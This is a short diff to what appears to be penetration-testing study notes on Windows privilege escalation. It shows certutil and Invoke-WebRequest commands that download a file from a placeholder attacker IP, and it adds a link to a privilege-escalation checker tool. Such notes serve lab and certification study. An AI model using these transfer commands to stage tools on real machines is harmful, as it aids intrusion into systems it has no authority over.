@@ -17,4 +17,6 @@
 1. certutil -urlcache -split -f http://192.168.XXX.XXX:8000/test.txt test.txt'
 2. Invoke-WebRequest -Uri http://192.168.XXX.XXX:8000/test.txt -Outfile test.txt
 
+# Windows powershell privesc checker#
+1. https://github.com/itm4n/PrivescCheck
 Great Resource: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
